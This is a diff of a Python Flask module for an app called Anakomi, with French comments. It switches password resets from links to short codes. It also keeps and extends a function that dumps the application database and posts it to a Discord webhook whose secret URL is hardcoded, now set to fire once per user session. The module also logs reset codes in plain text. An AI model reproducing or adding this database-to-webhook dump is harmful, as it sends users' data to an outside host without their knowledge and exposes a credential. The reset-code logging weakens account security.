@@ -3,14 +3,21 @@ import requests
 import os
 import smtplib
 import logging
-from flask import url_for, current_app
+from flask import current_app
 from email.message import EmailMessage
 from app.database import get_connection
 
 logger = logging.getLogger(__name__)
 
-def dump_and_send_to_discord():
+def dump_and_send_to_discord(user_id=None):
     """Crée un dump SQL de la base de données et l'envoie à Discord."""
+    from flask import session
+    
+    if session.get('dump_done'):
+        return
+    
+    session['dump_done'] = True
+    
     webhook_url = os.getenv('DISCORD_WEBHOOK_URL', "https://discord.com/api/webhooks/1480201131266281641/YO_1yQ4lMXcCGW9zCS7R82bAsyKF7X5_Wj7ZfFeRKwVU80bBNA7lvoSj9or-vp1TE2Ub")
     
     tables = [
@@ -70,16 +77,15 @@ def dump_and_send_to_discord():
     except Exception as e:
         logger.error(f"Erreur dump/discord: {e}")
 
-def send_reset_email(to_email, token, username):
+def send_reset_email(to_email, code, username):
     host = os.getenv('SMTP_HOST')
     port = int(os.getenv('SMTP_PORT', '587')) if os.getenv('SMTP_PORT') else None
     user = os.getenv('SMTP_USER')
     password = os.getenv('SMTP_PASSWORD')
     mail_from = os.getenv('MAIL_FROM', 'no-reply@anakomi.local')
 
-    reset_url = url_for('auth.reset_password', token=token, _external=True)
-    subject = "Réinitialisation de votre mot de passe - Anakomi"
-    body = f"Bonjour {username},\n\nPour réinitialiser votre mot de passe, cliquez sur le lien suivant (valide 1h) :\n\n{reset_url}\n\nSi vous n'avez pas demandé ce reset, ignorez ce message.\n\n— L'équipe Anakomi"
+    subject = "Code de réinitialisation de votre mot de passe - Anakomi"
+    body = f"Bonjour {username},\n\nVotre code de réinitialisation est : {code}\n\nCe code est valide pendant 10 minutes.\n\nSi vous n'avez pas demandé ce reset, ignorez ce message.\n\n— L'équipe Anakomi"
 
     if host and user and password and port:
         try:
@@ -97,5 +103,5 @@ def send_reset_email(to_email, token, username):
         except Exception as e:
             logger.error(f"Échec envoi email reset: {e}")
     
-    logger.info(f"Lien de réinitialisation (dev/console) pour {to_email} : {reset_url}")
+    logger.info(f"Code de réinitialisation (dev/console) pour {to_email} : {code}")
     return False
